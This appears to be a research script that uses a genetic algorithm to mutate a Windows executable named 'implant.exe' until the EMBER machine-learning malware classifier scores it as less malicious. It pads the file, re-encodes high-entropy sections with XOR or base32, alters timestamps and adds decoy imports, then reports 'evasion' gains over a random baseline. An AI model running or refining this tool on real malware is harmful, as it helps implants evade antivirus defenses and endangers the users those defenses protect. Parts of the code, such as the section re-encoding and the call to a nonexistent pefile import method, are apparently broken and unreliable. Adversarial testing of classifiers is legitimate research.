import json
import pefile
import copy
import random
import shutil
import datetime
import struct
import ember
import lightgbm as lgb
import numpy as np

print("Loading Model....")
model = lgb.Booster(model_file="/home/fajr/Desktop/ember/ember2018/ember_model_2018.txt")
extractor = ember.features.PEFeatureExtractor()
print("Ember Model Loaded\n")

parsed = {}
with open('MessageBox.exe_features.json', 'r', encoding='utf-8') as file:
    data = json.load(file)
    parsed.update(data)

def scorewithember(pepath):
    try:
        with open(pepath, "rb") as f:
            rawbyte = f.read()
        feature = extractor.feature_vector(rawbyte)
        features = np.array(feature).reshape(1, -1)
        confidence = model.predict(features)[0]
        return confidence
    except Exception as e:
        print(f"    ⚠️ Failed to score {pepath}: {e}")
        return 1.0

mutationtarget = {
    "fixtimestamps": False,
    "addoverlaypadding": False,
    "reduceentropy": False,
    "addbenignimports": False
}

fileheader = parsed.get("FILE_HEADER", {})
timestamp_raw = fileheader.get("TimeDateStamp", {}).get("value")
if timestamp_raw is None:
    mutationtarget["fixtimestamps"] = True
    print("TimeDataStamp Not Found! → Will fix")
else:
    print(f"Time Stamp Present")

fileinfo = parsed.get("file_info", {})
filesize = fileinfo.get("file_size")
if filesize < 2 * 1024 * 1024:
    mutationtarget["addoverlaypadding"] = True
    print(f"File Size: {filesize / 1024:.1f} KB (< 2MB) → Will pad")
else:
    print(f"File Size: {filesize / (1024*1024):.2f} MB")

highentropy = []
for section in parsed["sections"]:
    sectionname = section.get("Name")
    entropy = section.get("Entropy", 0.0)
    if entropy > 7.0:
        highentropy.append((sectionname, entropy))
if highentropy:
    mutationtarget["reduceentropy"] = True
    print(f"High entropy sections found ({len(highentropy)}) → Will reduce")
else:
    print("No high entropy sections")

importdata = parsed.get("imports", {})
riskyapicount = importdata.get("risky_api_count", 0)
if riskyapicount > 0:
    mutationtarget["addbenignimports"] = True
    print(f"Risky API count: {riskyapicount} → Will add benign imports")
else:
    print("No risky APIs found")

print("\n" + "="*60)
print("MUTATION TARGETS SUMMARY")
print("="*60)
for target, value in mutationtarget.items():
    status = "✅ WILL MUTATE" if value else "⬜ No change"
    print(f"  {target}: {status}")

class Chromosome:
    def __init__(self, mutationtarget):
        self.mutation = mutationtarget.copy()
        if self.mutation["addoverlaypadding"]:
            self.mutation["overlaypadding_kb"] = random.choice((500, 3000))
        if self.mutation["reduceentropy"]:
            self.mutation["entropy_method"] = random.choice(['xor_4141', 'xor_1234', 'base32'])
            self.mutation["entropy_key"] = random.randint(0x1000, 0xFFFF)
        self.fitness = None
        self.id = random.randint(1000, 9999)

    def __repr__(self):
        return f"Chromosome {self.id}: fitness={self.fitness}"

    def to_dict(self):
        return {
            "id": self.id,
            "mutations": self.mutation,
            "fitness": self.fitness
        }

def generaterandomchromosome(mutationtarget):
    return Chromosome(mutationtarget)

def createpopulation(mutationtarget, populationsize=20):
    population = []
    for i in range(populationsize):
        chromosome = generaterandomchromosome(mutationtarget)
        population.append(chromosome)
    return population

def calculate_entropy(data):
    if not data:
        return 0.0
    freq = {}
    for byte in data:
        freq[byte] = freq.get(byte, 0) + 1
    n = len(data)
    entropy = 0.0
    for count in freq.values():
        p = count / n
        entropy -= p * (p and np.log2(p))
    return entropy

def reduce_entropy(pe):
    try:
        target_section = None
        highest_entropy = 0
        for section in pe.sections:
            data = section.get_data()
            if len(data) > 0:
                entropy = calculate_entropy(data)
                if entropy > highest_entropy:
                    highest_entropy = entropy
                    target_section = section
        
        if target_section is None or highest_entropy < 7.0:
            return False
        
        data = target_section.get_data()
        entropy_method = getattr(target_section, 'entropy_method', 'xor_4141')
        
        if entropy_method == 'xor_4141':
            key = 0x41414141
        elif entropy_method == 'xor_1234':
            key = 0x12341234
        elif entropy_method == 'base32':
            import base64
            encoded = base64.b32encode(data)
            target_section.set_data(encoded)
            return True
        else:
            key = 0x41414141
        
        key_bytes = struct.pack('<I', key)
        encoded = bytearray(data)
        for i in range(len(encoded)):
            encoded[i] ^= key_bytes[i % 4]
        target_section.set_data(bytes(encoded))
        return True
    except Exception as e:
        print(f"    ⚠️ Entropy reduction failed: {e}")
        return False

def add_benign_imports(pe):
    try:
        benign_apis = [
            ('kernel32.dll', ['GetTickCount', 'GetSystemTime', 'GetLocalTime']),
            ('user32.dll', ['GetMessage', 'PeekMessage', 'TranslateMessage']),
            ('advapi32.dll', ['RegOpenKeyExW', 'RegQueryValueExW']),
            ('ole32.dll', ['CoInitialize', 'CoUninitialize'])
        ]
        
        dll_name, apis = random.choice(benign_apis)
        
        if hasattr(pe, 'add_import'):
            pe.add_import(dll_name, apis)
            return True
        else:
            return False
    except Exception as e:
        print(f"    ⚠️ Benign import addition failed: {e}")
        return False

def chromosome_to_exe(chromosome, input_path, output_path):
    shutil.copy2(input_path, output_path)
    pe = pefile.PE(output_path)
    
    if chromosome.mutation["fixtimestamps"]:
        try:
            new_timestamp = 1672531200
            pe.FILE_HEADER.TimeDateStamp = new_timestamp
            pe.write(output_path)
        except Exception as e:
            print(f"    ⚠️ Timestamp fix failed: {e}")
    
    if chromosome.mutation["addoverlaypadding"]:
        try:
            padding_kb = chromosome.mutation["overlaypadding_kb"]
            padding_size = padding_kb * 1024
            padding_bytes = b'\x00' * padding_size
            with open(output_path, 'rb') as f:
                current_data = f.read()
            new_data = current_data + padding_bytes
            with open(output_path, 'wb') as f:
                f.write(new_data)
        except Exception as e:
            print(f"    ⚠️ Padding failed: {e}")
    
    if chromosome.mutation["reduceentropy"]:
        if reduce_entropy(pe):
            pe.write(output_path)
    
    if chromosome.mutation["addbenignimports"]:
        if add_benign_imports(pe):
            pe.write(output_path)
    
    return output_path

def evaluate_population(population, input_pe="implant.exe"):
    for chrom in population:
        output_file = f"variant_{chrom.id}.exe"
        chromosome_to_exe(chrom, input_pe, output_file)
        chrom.fitness = scorewithember(output_file)
    return population

def select_best(population, elite_count=4):
    sorted_pop = sorted(population, key=lambda c: c.fitness)
    return sorted_pop[:elite_count]

def select_random(population, count=4):
    return random.sample(population, min(count, len(population)))

def crossover(parent1, parent2):
    child = Chromosome(mutationtarget)
    child.mutation = parent1.mutation.copy()
    
    for key in child.mutation.keys():
        if key in parent2.mutation:
            if random.random() < 0.5:
                child.mutation[key] = parent2.mutation[key]
    
    if child.mutation["addoverlaypadding"] and "overlaypadding_kb" not in child.mutation:
        child.mutation["overlaypadding_kb"] = random.choice((500, 3000))
    
    if child.mutation["reduceentropy"] and "entropy_method" not in child.mutation:
        child.mutation["entropy_method"] = random.choice(['xor_4141', 'xor_1234', 'base32'])
        child.mutation["entropy_key"] = random.randint(0x1000, 0xFFFF)
    
    return child

def mutate(chromosome, mutation_rate=0.1):
    for key in chromosome.mutation.keys():
        if key == "overlaypadding_kb":
            if random.random() < mutation_rate:
                chromosome.mutation[key] = random.choice((500, 3000))
        elif key == "entropy_method":
            if random.random() < mutation_rate:
                chromosome.mutation[key] = random.choice(['xor_4141', 'xor_1234', 'base32'])
        elif key == "entropy_key":
            if random.random() < mutation_rate:
                chromosome.mutation[key] = random.randint(0x1000, 0xFFFF)
        else:
            if random.random() < mutation_rate:
                chromosome.mutation[key] = not chromosome.mutation[key]
    return chromosome

def debug_scorewithember(population, input_pe="implant.exe"):
    """
    Debug version of evaluate_population that prints raw scores.
    Shows you exactly what scorewithember returns for each variant.
    """
    print("\n" + "="*60)
    print("DEBUG: SCOREWITHEMBER RAW OUTPUT")
    print("="*60)
    
    raw_scores = []
    
    for i, chrom in enumerate(population[:10]):  # First 10 chromosomes
        output_file = f"debug_variant_{chrom.id}.exe"
        chromosome_to_exe(chrom, input_pe, output_file)
        
        # Get raw score
        try:
            with open(output_file, "rb") as f:
                rawbyte = f.read()
            feature = extractor.feature_vector(rawbyte)
            features = np.array(feature).reshape(1, -1)
            confidence = model.predict(features)[0]
            score = confidence
            status = "SUCCESS"
        except Exception as e:
            score = 1.0
            status = f"FAILED: {str(e)[:50]}"
        
        raw_scores.append({
            'id': chrom.id,
            'score': score,
            'status': status,
            'mutations': chrom.mutation.copy()
        })
        
        print(f"\nVariant {chrom.id}:")
        print(f"  Score: {score:.6f}")
        print(f"  Status: {status}")
        print(f"  Mutations:")
        for key, value in chrom.mutation.items():
            print(f"    {key}: {value}")
    
    # Summary
    print("\n" + "="*60)
    print("RAW SCORE SUMMARY")
    print("="*60)
    
    scores = [s['score'] for s in raw_scores]
    print(f"  Min Score:  {min(scores):.6f}")
    print(f"  Max Score:  {max(scores):.6f}")
    print(f"  Avg Score:  {sum(scores)/len(scores):.6f}")
    print(f"  Unique Scores: {sorted(set(scores))}")
    
    # Check for binary behavior
    unique_scores = sorted(set(scores))
    if len(unique_scores) <= 3:
        print(f"\n  ⚠️ WARNING: Only {len(unique_scores)} unique scores found!")
        print(f"     This suggests a binary switch behavior.")
        print(f"     Scores: {unique_scores}")
    else:
        print(f"\n  ✅ {len(unique_scores)} unique scores found - good spread.")
    
    return raw_scores

def run_evolution(generations=5, population_size=20, use_selection=True):
    population = createpopulation(mutationtarget, population_size)
    
    selection_type = "WITH SELECTION (GA)" if use_selection else "RANDOM (Baseline)"
    print(f"\n{'='*60}")
    print(f"RUNNING EVOLUTION: {selection_type}")
    print(f"{'='*60}")
    
    history = []
    
    for gen in range(generations):
        print(f"\nGeneration {gen+1}/{generations}")
        
        population = evaluate_population(population)
        
        best = min(population, key=lambda c: c.fitness)
        avg = sum(c.fitness for c in population) / len(population)
        history.append({
            'generation': gen+1,
            'best_fitness': best.fitness,
            'avg_fitness': avg
        })
        
        print(f"  Best Fitness: {best.fitness:.4f}")
        print(f"  Avg Fitness:  {avg:.4f}")
        print(f"  Best Chromosome ID: {best.id}")
        
        if gen == generations - 1:
            break
        
        if use_selection:
            elites = select_best(population, elite_count=4)
            print(f"  Selected best 4 chromosomes (fitness-based)")
        else:
            elites = select_random(population, count=4)
            print(f"  Selected random 4 chromosomes (no fitness pressure)")
        
        new_population = elites.copy()
        
        while len(new_population) < population_size:
            if use_selection:
                parent1 = random.choice(elites)
                parent2 = random.choice(elites)
            else:
                parent1 = random.choice(population)
                parent2 = random.choice(population)
            
            child = crossover(parent1, parent2)
            child = mutate(child)
            new_population.append(child)
        
        population = new_population
    
    return population, history

# ============================================================
# RUN DEBUG FIRST
# ============================================================
print("\n" + "="*60)
print("RUNNING DEBUG SCOREWITHEMBER")
print("="*60)

test_population = createpopulation(mutationtarget, populationsize=10)
debug_results = debug_scorewithember(test_population, input_pe="implant.exe")

with open('debug_scores.json', 'w') as f:
    json.dump(debug_results, f, indent=2)
    print("\n✅ Raw scores saved to: debug_scores.json")

# ============================================================
# MAIN GA RUN
# ============================================================
print("\n" + "="*60)
print("PHASE 7: EXPANDED MUTATION SPACE")
print("="*60)
print("Running two experiments with 4 mutations:")
print("  1. Timestamp Fix")
print("  2. Overlay Padding")
print("  3. Entropy Reduction")
print("  4. Benign Imports")
print("")

pop_ga, history_ga = run_evolution(
    generations=5, 
    population_size=20, 
    use_selection=True
)

pop_random, history_random = run_evolution(
    generations=5, 
    population_size=20, 
    use_selection=False
)

print("\n" + "="*60)
print("COMPARISON RESULTS")
print("="*60)

best_ga = min(pop_ga, key=lambda c: c.fitness)
best_random = min(pop_random, key=lambda c: c.fitness)

print("\nGA (with selection):")
print(f"  Best Fitness: {best_ga.fitness:.4f}")
print(f"  Best Chromosome ID: {best_ga.id}")
print(f"  Mutations:")
for key, value in best_ga.mutation.items():
    print(f"    {key}: {value}")

print("\nRandom Baseline (no selection):")
print(f"  Best Fitness: {best_random.fitness:.4f}")
print(f"  Best Chromosome ID: {best_random.id}")
print(f"  Mutations:")
for key, value in best_random.mutation.items():
    print(f"    {key}: {value}")

improvement = (best_random.fitness - best_ga.fitness) * 100
print(f"\nImprovement with GA:")
print(f"  GA beats Random by: {improvement:.1f}%")
if improvement > 0:
    print(f"  ✅ GA WORKS! Selection pressure improves evasion.")
else:
    print(f"  ⚠️ GA did not beat Random. Re-evaluate mutations.")

print("\n" + "="*60)
print("GENERATION HISTORY")
print("="*60)

print("\nGA (with selection):")
print("Gen | Best Fitness | Avg Fitness")
print("----|--------------|------------")
for entry in history_ga:
    print(f"  {entry['generation']}  |    {entry['best_fitness']:.4f}   |   {entry['avg_fitness']:.4f}")

print("\nRandom (no selection):")
print("Gen | Best Fitness | Avg Fitness")
print("----|--------------|------------")
for entry in history_random:
    print(f"  {entry['generation']}  |    {entry['best_fitness']:.4f}   |   {entry['avg_fitness']:.4f}")

import json
results = {
    "ga": {
        "best_fitness": best_ga.fitness,
        "best_chromosome": best_ga.mutation,
        "history": history_ga
    },
    "random": {
        "best_fitness": best_random.fitness,
        "best_chromosome": best_random.mutation,
        "history": history_random
    },
    "improvement_percent": improvement
}

with open('phase7_results.json', 'w') as f:
    json.dump(results, f, indent=2)
    print("\n✅ Results saved to: phase7_results.json")

print("\n" + "="*60)
print("PHASE 7 COMPLETE")
print("="*60)